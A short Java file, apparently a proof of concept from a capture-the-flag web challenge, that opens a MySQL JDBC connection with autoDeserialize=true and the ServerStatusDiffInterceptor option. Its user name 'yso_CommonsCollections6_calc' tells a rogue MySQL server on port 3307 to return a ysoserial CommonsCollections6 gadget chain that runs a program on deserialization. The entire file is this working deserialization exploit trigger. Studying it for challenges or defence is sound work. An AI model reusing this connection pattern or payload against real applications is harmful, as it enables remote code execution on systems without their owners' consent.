package gdufs.challenge.web;


import java.io.IOException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class Main {
    public static void main(String[] args) throws IOException, ClassNotFoundException, SQLException {

        Class.forName("com.mysql.cj.jdbc.Driver");
        String user = "yso_CommonsCollections6_calc";
        String jdbc_url = "jdbc:mysql://127.0.0.1:3307/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user="+user;
        Connection conn = DriverManager.getConnection(jdbc_url);
        conn.close();

    }
}

